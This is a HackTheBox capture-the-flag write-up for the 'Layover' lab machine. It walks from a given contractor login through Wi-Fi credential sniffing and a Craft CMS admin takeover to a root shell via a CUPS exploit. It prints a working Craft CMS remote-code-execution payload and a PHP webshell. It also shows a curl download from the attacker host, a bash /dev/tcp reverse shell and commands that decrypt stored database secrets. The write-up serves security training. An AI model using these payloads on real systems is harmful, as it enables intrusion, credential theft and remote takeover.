# HackTheBox - Layover (Medium)

**Box IP:** 10.129.126.71  
**OS:** Linux  
**Difficulty:** Medium

---

## Attack Chain

1. RDP access given as contractor -> sudo su works -> need to move laterally
2. WiFi recon -> wlan3 in monitor mode -> capture HTTP traffic -> sniff plaintext credentials
3. Craft CMS admin login -> authenticated RCE via Yii AttributeTypecastBehavior gadget chain
4. Webshell dropped -> reverse shell as www-data
5. .env file -> DB creds + Craft security key -> decrypt encrypted DB value -> SSH as aporter -> user flag
6. CUPS 2.4.16 (CVE-2026-34990) -> root flag

---

## 1. Initial Access

Credentials were given for this box:
```
contractor / Contractor2026!
```

Connected via RDP:
```bash
xfreerdp /v:10.129.126.71 /u:contractor /p:'Contractor2026' /cert:ignore /dynamic-resolution
```

Tried sudo straight away:
```bash
sudo su
```

Got root but there was nothing there of interest. This was a contractor account on what looked like an airport WiFi portal box. The browser opened automatically to `http://portal.international.htb/miles`, an airport themed captive portal. Added the domain to hosts and started looking at what else was on the network.

---

## 2. WiFi Packet Capture

Ran a quick dump of the network interfaces to see what was available:
```bash
nmcli device status
iw dev
```

Found `wlan2` and `wlan3`. wlan2 was already associated and sitting on channel 6. wlan3 supported monitor mode which is what we needed.

Put wlan3 into monitor mode on the same channel:
```bash
ip link set wlan3 down
iw dev wlan3 set type monitor
ip link set wlan3 up
iw dev wlan3 set channel 6
```

Kicked off a capture filtering for HTTP traffic and left it running for a few minutes:
```bash
tshark -i wlan3 -f "tcp port 80" -w /root/gottem2.pcap
```

Pulled the POST data out of the capture:
```bash
tshark -r /root/gottem2.pcap -Y "http.request.method == POST" -T fields -e http.file_data
```

Got hex back:
```
757365726e616d653d6a656e6e792670617373776f72643d466c316768744465636b3230323621
```

Decoded it:
```bash
echo "757365726e616d653d6a656e6e792670617373776f72643d466c316768744465636b3230323621" | xxd -r -p
```

```
username=jenny&password=Fl1ghtDeck2026!
```

---

## 3. Craft CMS Admin Access

Logged into the admin panel from inside the RDP session since it was on the internal network only:
```
http://portal.international.htb/admin/login
jenny / Fl1ghtDeck2026!
```

Worked first try. Checked the CMS version since a curl earlier had shown `X-Powered-By: Craft CMS` in the response headers. The version running was vulnerable to an authenticated RCE via a malicious Behavior attachment that abuses Yii's `AttributeTypecastBehavior` to call `Psy\Readline\Hoa\ConsoleProcessus::execute`. This matches GHSA-255j-qw47-wjh5.

Opened the browser console (Ctrl+Shift+J), typed `allow pasting` to get past Chrome's paste block, then ran a blind sleep test to confirm execution:

```javascript
(async () => {
  const csrf = window.Craft.csrfTokenValue;
  const b = { elementType: "craft\\elements\\Category", siteId: 1, search: "",
  condition: { class: "craft\\elements\\conditions\\ElementCondition", elementType: "craft\\elements\\Category",
  fieldLayouts: [ { "as rce": { "__class": "yii\\behaviors\\AttributeTypecastBehavior",
  "__construct()": [ { attributeTypes: { typecastBeforeSave: ["Psy\\Readline\\Hoa\\ConsoleProcessus","execute"] },
  typecastBeforeSave: "sleep 8" } ] }, "on *": "self::beforeSave" } ] } };
  const url='/index.php?p=admin/actions/element-search/search';
  const t0 = performance.now();
  const r = await fetch(url,{method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json','X-CSRF-Token':csrf},body:JSON.stringify(b)});
  return `status=${r.status} elapsed=${Math.round(performance.now()-t0)}ms`;
})()
```

Response came back at around 8000ms. RCE confirmed.

---

## 4. Webshell and Reverse Shell

Made a simple PHP webshell:
```php
<?php system($_GET['cmd']); ?>
```

Served it from the attack box:
```bash
python3 -m http.server 8000
```

Used the same console gadget to have the server pull the webshell and overwrite the site's index.php:

```javascript
(async () => {
  const csrf = window.Craft.csrfTokenValue;
  const fire = (cmd) => {
    const b = { elementType: "craft\\elements\\Category", siteId: 1, search: "",
    condition: { class: "craft\\elements\\conditions\\ElementCondition", elementType: "craft\\elements\\Category",
    fieldLayouts: [ { "as rce": { "__class": "yii\\behaviors\\AttributeTypecastBehavior",
    "__construct()": [ { attributeTypes: { typecastBeforeSave: ["Psy\\Readline\\Hoa\\ConsoleProcessus","execute"] },
    typecastBeforeSave: cmd } ] }, "on *": "self::beforeSave" } ] } };
    const url='/index.php?p=admin/actions/element-search/search';
    const t0 = performance.now();
    return fetch(url,{method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json','X-CSRF-Token':csrf},body:JSON.stringify(b)})
      .then(r=>r.text().then(t=>({status:r.status, ms: Math.round(performance.now()-t0), head:t.slice(0,60)})));
  };
  const timed = await fire("curl http://10.13.37.182:8000/shell.php --output /var/www/portal/web/index.php");
  return JSON.stringify({timed});
})()
```

Python server logged `GET /shell.php 200`. Confirmed the shell was in place:
```
http://portal.international.htb/index.php?cmd=id
-> uid=33(www-data) gid=33(www-data)
```

Set up a listener and triggered a reverse shell. The encoding for the curl command needs to be form-style URL encoding, not standard URL encoding:
```bash
nc -lvnp 5555
```

```bash
curl -s "http://portal.international.htb/index.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.13.37.182/5555+0>%261'"
```

Got a shell back as www-data.

---

## 5. User Flag

Checked the Craft CMS `.env` file since that is always where the good stuff is:
```bash
cat /var/www/portal/.env
```

```
CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craft
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftDB_pw_2026
```

Got the security key and DB credentials in one shot. Connected to MySQL and looked around:
```bash
mysql -h127.0.0.1 -ucraftuser -pCraftDB_pw_2026 craft -e "SHOW TABLES;"
```

Found an interesting table: `htbairways_settings`

```bash
mysql -h127.0.0.1 -ucraftuser -pCraftDB_pw_2026 craft -e "SELECT * FROM htbairways_settings;"
```

```
id  name               value
1   mailRelayPassword  u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=
```

That value is Craft's own encrypted format. Since we already had the security key from the `.env` we could decrypt it directly using Craft's own Yii Security class:

```bash
php -r 'require "/var/www/portal/vendor/autoload.php"; $s = new yii\base\Security(); $key = "IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr"; $blob = "u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w="; echo $s->decryptByKey(base64_decode($blob), $key), "\n";'
```

```
Skyp0rt_Relay!26
```

Tried it for SSH since credentials are almost always reused somewhere:
```bash
ssh aporter@portal.international.htb
# password: Skyp0rt_Relay!26
```

Worked.

```bash
cat ~/user.txt
# 6afc95a08014b9d********05e77
```

---

## 6. Root Flag

Checked sudo permissions first:
```bash
sudo -l
# nope
```

Looked at what services were running:
```bash
ps aux
```

Spotted CUPS running:
```bash
/usr/sbin/cupsd -f
```

Checked the version:
```bash
cups-config --version
# 2.4.16
```

Vulnerable to CVE-2026-34990. Used the public PoC:
```
https://github.com/Noorkhalel/CVE-2026-34990-CUPS-LPE-PoC
```

Ran it and got root.

```bash
cat /root/root.txt
# 0c28233fd8a33b*******a67ea9e5d
```

---

## Credentials

| User | Password | Where |
|------|----------|-------|
| contractor | Contractor2026! | RDP (given) |
| jenny | Fl1ghtDeck2026! | Craft CMS admin (sniffed from WiFi) |
| craftuser | CraftDB_pw_2026 | MySQL |
| aporter | Skyp0rt_Relay!26 | SSH (decrypted from DB) |

## Flags

| Flag | Value |
|------|-------|
| user.txt | 6afc95a08014b9d********05e77 |
| root.txt | 0c28233fd8a33b*******a67ea9e5d |
